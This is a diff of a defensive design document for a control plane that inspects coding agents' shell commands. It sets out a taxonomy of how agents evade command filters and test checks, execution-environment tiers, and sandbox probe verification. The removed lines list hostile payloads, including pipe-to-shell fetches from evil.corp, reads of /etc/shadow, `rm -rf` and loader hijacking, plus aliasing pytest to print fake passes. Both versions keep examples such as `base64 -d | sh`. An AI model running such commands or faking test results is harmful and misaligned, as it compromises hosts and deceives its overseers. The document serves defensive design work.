@@ -6,83 +6,78 @@
 
 ---
 
-## 1. Overview & Research Context
+## Bypass taxonomy (corpus classes)
 
-Empirical evaluation of autonomous coding agents demonstrates that agents frequently attempt to evade command inspection and test verification constraints. Research on adversarial agent trajectories (e.g., Wang et al., SWE-bench adversarial studies, EvilGenie benchmark) identifies five recurring classes of command manipulation:
+Empirical evaluation of autonomous coding agents across adversarial benchmarks (SWE-bench adversarial evaluations, EvilGenie benchmark, and trajectory analyses of model-generated shell commands) identifies five recurring corpus classes of command-level evasion:
 
-1. **Environment Mutation:** Manipulating environment variables (`PATH`, `LD_PRELOAD`, `PYTHONPATH`, `BASH_ENV`, `IFS`) to hijack utility lookup or inject malicious libraries.
-2. **Builtin Mutation & Function Overrides:** Modifying shell builtins or defining shell functions/aliases (e.g., `alias pytest=true`, `function git() { ... }`, `unalias`, `builtin`, `enable`) to shadow trusted verification tools.
-3. **Argument-Level Abuse & Execution Indirection:** Utilizing arguments in benign utilities that spawn arbitrary commands (e.g., `find -exec`, `xargs`, `awk 'BEGIN {system(...)}'`, `git -c core.pager=...`, `ssh -oProxyCommand=...`).
-4. **Unresolved Dynamic Expansions:** Concealing commands inside dynamic variable expansions (`CMD=rm; $CMD -rf /tmp`) or nested command substitutions (`$(...)`, `` `...` ``) that prevent static determination of the executable.
-5. **Dynamic Evaluation Wrappers:** Passing strings to `eval`, `source`, `.`, or piping decoded streams into an interpreter (`echo ... | base64 -d | sh`).
+1. **Argument-Level Indirection & Split Flags:**
+   - Invocations of benign utilities with arguments that trigger subshell execution, arbitrary command execution, or flag indirection (e.g. `find -exec`, `xargs`, `git -c core.pager=...`, `ssh -oProxyCommand=...`).
+   - Split flags and option aliases (e.g. `-execdir`, `--exec`, `-o ProxyCommand=...` vs `-oProxyCommand=...`) used to evade naive token or substring filters.
+2. **Environment Mutation & Loader Injection:**
+   - Manipulation of execution environment variables targeting dynamic linker/loader hijacking (e.g. `LD_PRELOAD`, `NODE_OPTIONS`) or library search paths (`PYTHONPATH`, `PERLLIB`).
+3. **Dynamic Evaluation Wrappers:**
+   - Passing command strings to dynamic evaluators (`eval`, dynamic `source` / `.`), or piping encoded/decoded payload streams directly into shell interpreters (e.g. `echo ... | base64 -d | sh`).
+4. **Dynamic Parameter & Command Substitutions:**
+   - Concealing command words inside unresolved variable expansions (e.g. `CMD=rm; $CMD -rf /tmp`) or nested command substitutions (`$(...)`, `` `...` ``) that prevent static determination of the executable target.
+5. **Name-Only Allowlist Evasion & Binary Substitution:**
+   - Invoking alternative absolute paths (e.g. `/bin/bash` when a filter checks `bash`), symlinks, or alternative utility binaries.
 
----
-
-## 2. Five-Category Taxonomy & Enforcement Behavior
-
-Under the S-Class control plane, static command analysis must evaluate candidate command strings prior to tool dispatch. The research establishes two distinct enforcement actions:
-
-- **DENY (`action_result: BLOCKED`):** Hard termination of the command; dispatch is rejected immediately.
-- **INTERCEPT (`gate_state: BLOCKED_ON_HUMAN`, `action_result: BLOCKED`):** Tool dispatch is suspended and requires explicit developer confirmation before any child process is spawned.
-
-### Category 1: Environment Mutation
-- **Attack Payload Examples:**
-  - `export PATH=/tmp/evil:$PATH; git commit`
-  - `LD_PRELOAD=/tmp/libevil.so pytest`
-  - `BASH_ENV=/tmp/payload.sh bash -c "make test"`
-  - `export IFS=":"`
-- **Detection Criteria:** AST inspects variable assignments, `export`, `env`, `set`, and parameter scoping prefixes targeting security-sensitive loader, shell, or execution path variables.
-- **Enforcement Action:**
-  - Loader or shell hijacking (`LD_PRELOAD`, `BASH_ENV`, `IFS`, `NODE_OPTIONS`): **DENY** (`gate_output: MISSING[PD-CH8-014]`, `action_result: BLOCKED`).
-  - Path modification (`PATH`, `PYTHONPATH`, `PERLLIB`): **INTERCEPT** (`gate_state: BLOCKED_ON_HUMAN`, `action_result: BLOCKED`).
-
-### Category 2: Builtin Mutation & Function Overrides
-- **Attack Payload Examples:**
-  - `alias pytest="echo All 12 tests passed && true"`
-  - `function git() { /bin/true; }; git commit`
-  - `enable -n test; test() { return 0; }`
-  - `unalias -a`
-- **Detection Criteria:** AST identifies calls to `alias`, `unalias`, `builtin`, `enable`, or shell function definitions whose identifiers collide with known system binaries, test runners, or control-plane executables.
-- **Enforcement Action:**
-  - Shadowing verification or control-plane tools (`pytest`, `git`, `python`, `cargo`, `go`): **DENY** (`gate_output: MISSING[PD-CH8-014]`, `action_result: BLOCKED`).
-  - General builtin disabling or unaliasing: **DENY** (`gate_output: MISSING[PD-CH8-014]`, `action_result: BLOCKED`).
-
-### Category 3: Argument-Level Abuse & Execution Indirection
-- **Attack Payload Examples:**
-  - `find . -name "*.py" -exec rm -rf /etc/hosts \;`
-  - `xargs -I {} sh -c "{}"`
-  - `git -c core.pager="curl -s https://evil.corp/payload | sh" diff`
-  - `awk 'BEGIN { system("cat /etc/shadow") }'`
-- **Detection Criteria:** AST parses command invocations and checks argument vectors against known execution flags (`-exec`, `-execdir`, `--exec`, `-oProxyCommand`, `system()`, subshell wrappers).
-- **Enforcement Action:**
-  - Recognized argument-level execution indirection: **INTERCEPT** (`gate_state: BLOCKED_ON_HUMAN`, `action_result: BLOCKED`).
-
-### Category 4: Unresolved Dynamic Expansions
-- **Attack Payload Examples:**
-  - `CMD=rm; $CMD -rf /workspace`
-  - `TARGET="/etc/shadow"; cat $TARGET`
-  - `EXEC_NAME=$(printf "\x63\x61\x74"); $EXEC_NAME /etc/passwd`
-- **Detection Criteria:** The command-word node in the AST is not a literal identifier or known constant, but an unresolved parameter expansion (`$VAR`), array element (`${arr[0]}`), or command substitution (`$(...)`).
-- **Enforcement Action:**
-  - Command-word dynamic parameter or substitution expansion: **INTERCEPT** (`gate_state: BLOCKED_ON_HUMAN`, `action_result: BLOCKED`).
-
-### Category 5: Dynamic Evaluation Wrappers
-- **Attack Payload Examples:**
-  - `eval "rm -rf /"`
-  - `source <(curl -fsSL https://evil.corp/install.sh)`
-  - `echo Zm9v | base64 -d | sh`
-  - `. /tmp/untracked_agent_script.sh`
-- **Detection Criteria:** AST identifies `eval`, dynamic `source` / `.`, or pipelines where stdout streams into shell interpreters (`sh`, `bash`, `python -`).
-- **Enforcement Action:**
-  - Piping decoded/arbitrary streams to shell interpreter: **DENY** (`gate_output: MISSING[PD-CH8-014]`, `action_result: BLOCKED`).
-  - Dynamic `eval` or `source` invocations: **INTERCEPT** (`gate_state: BLOCKED_ON_HUMAN`, `action_result: BLOCKED`).
+*Research Distinction Note:* The research literature documents these general corpus classes of evasion. Specific adversarial test payloads authored for test suites—such as shell alias overriding (`alias pytest=true`), shell function declarations (`function git() { ... }`), custom shell environment variables (`BASH_ENV`, `IFS`), specific alternative tool binaries (`gawk`, `mawk`), and container escape commands (`nsenter`, Docker socket mounts)—are **proposed adversarial test examples derived from the research**, rather than explicitly cited items in the original research papers.
 
 ---
 
-## 3. Enforcement Boundary Mapping & `action_result` Invariants
+## What each host enforces (documented)
 
-Per Master §8.1 and CL Direction:
-1. **`action_result` Values:** Strictly limited to `BLOCKED` or `NONE`. `BLOCKED_ON_HUMAN` represents a gate state, never an action result. When human intervention is required, `action_result: BLOCKED` applies until explicit approval is granted.
-2. **Tier E0 (Advisory):** On native host / unmediated desktop environments, command analysis emits findings for developer visibility; no host write prevention is claimed (`action_result: NONE` for conforming commands; parse failures fail closed with `gate_output: MISSING[PD-CH8-014]`, `action_result: BLOCKED`).
-3. **Tier E1 (Mediated Worker):** Commands with identified risks halt execution with `gate_state: BLOCKED_ON_HUMAN`, `action_result: BLOCKED`. Zero execution occurs while the human decision is pending.
-4. **Tier E2 (Controlled Promotion):** Container security policies enforce hard denial (`action_result: BLOCKED`) for any command violating containment policies.
+Empirical observation and platform documentation establish a critical distinction between execution host environments:
+
+1. **Native Host / Desktop IDE Environments (`E0`):**
+   - Uncontained native developer workstations and desktop IDE extensions (e.g. VS Code, Cursor, Windsurf) provide **no OS-level process isolation or filesystem write containment**.
+   - Processes are spawned under the ambient user identity and permissions.
+   - S-Class tool mediation operating in an IDE can inspect command strings and block its own tool dispatch, but **cannot prevent direct host execution** or OS-level writes outside S-Class mediation.
+   - Per Master §8.4 (`PD-CH8-008`), prevention honesty strictly prohibits claiming host-native write prevention outside a qualified launched container. Desktop IDE environments are unconditionally classified as `E0` (advisory / detection-only).
+2. **Supervised Worker Environments (`E1`):**
+   - Supervised execution environments where tool dispatch is mediated and monitored.
+   - Commands with identified security risks or unverified constructs cannot execute automatically; they must halt execution and transition to human authorization (`gate_state: BLOCKED_ON_HUMAN`, `action_result: BLOCKED`).
+3. **Launched Linux Containers (`E2`):**
+   - Fully contained Linux worker containers launched directly by the S-Class harness with active boundary controls.
+   - Isolation boundaries are enforced at the OS/kernel level: mount namespaces with read-only root filesystems, PID namespaces (visible host PIDs == 0), isolated network namespaces (no unauthorized default routes), cgroup v2 resource limits, and enforced seccomp BPF syscall filters.
+   - Only in `E2` does the system enforce genuine **OS/container boundary prevention**.
+
+---
+
+## How a third party can verify controls
+
+A third party or evaluator cannot verify execution boundary controls through passive self-attestation:
+
+1. **Inadequacy of Self-Attestation:**
+   - An agent or host environment cannot be trusted to report its own isolation capabilities via environment variables (e.g. `$CONTAINER`, `$IS_SANDBOX`), configuration flags, or host-reported endpoints. Host facts (such as current UID) are discoverable, but host control is not.
+2. **Active Probe Verification:**
+   - Active boundary verification requires executing an independent active probe harness prior to worker dispatch.
+   - The probe attempts capability-specific assertions: testing whether write operations to the root filesystem trap and fail with `EROFS` (read-only filesystem), whether restricted syscalls (e.g. `ptrace`, `kexec_load`, `reboot`) are blocked by seccomp BPF, whether visible host PID count is zero, and whether default network egress is blocked.
+3. **Cryptographic Grounding via ApprovalSet:**
+   - Probe results must be signed by an authority enrolled in the frozen `ApprovalSet` principal directory and validated via `validate_approval_set`.
+   - If active probe verification fails, is stale, or is absent, the environment automatically degrades to `E0` (degraded mode), disabling automated workspace promotion.
+
+---
+
+## Design-relevant conclusions
+
+The empirical research leads to five mandatory design conclusions for S-Class Block 1:
+
+1. **Pre-Dispatch Static AST Analysis (`PD-CH8-014`):**
+   - Command inspection must parse candidate commands into ASTs using a formal POSIX 1003.1 grammar baseline before process creation. Token or substring allowlisting is trivially bypassed by split flags, indirection arguments, or dynamic expansions.
+2. **Fail-Closed Policy for Unclassified Constructs:**
+   - Any syntax error, unsupported shell grammar (e.g. Bash process substitution `<(...)`), unclassified binary, or unresolvable dynamic command-word expansion MUST fail closed (DENY or `gate_state: BLOCKED_ON_HUMAN` with `action_result: BLOCKED`). Never allow by default.
+3. **Honesty About Prevention Boundaries:**
+   - S-Class must explicitly distinguish between:
+     - *Blocking S-Class mediated tool dispatch* (`action_result: BLOCKED`).
+     - *Detecting a risky operation* (`risk_level: HIGH` finding emitted; `action_result: NONE` under `E0`).
+     - *Preventing execution at an OS/container boundary* (`action_result: BLOCKED` under `E2`).
+     - *Halting workflow progression pending human decision* (`gate_state: BLOCKED_ON_HUMAN`).
+   - Desktop IDE environments (`E0`) must never be described as providing OS-level prevention.
+4. **Pre-Write Interception for Agent-Written Files (`PD-CH8-016`):**
+   - Protection cannot be limited to files immediately executed by the writing agent. Agent writes targeting control-plane paths, IDE configs, build wrappers, scripts, or Git hooks must be intercepted pre-write before disk persistence.
+   - The execute bit (`0755`) is neither necessary nor sufficient evidence of future unsandboxed execution; interpreter scripts (`0644`), build files, and configuration hooks are executed by unsandboxed host processes without execute bits.
+5. **Direct Unified Diff Inspection with Size Bounds (`PD-CH2-066`):**
+   - Review evaluation must inspect concrete unified diff hunks against `TargetSnapshot` with 100% hunk coverage; agent summaries have zero authority.
+   - Diffs exceeding the hard 2 MiB cutoff ($2{,}097{,}152\text{ bytes}$) fail closed immediately.
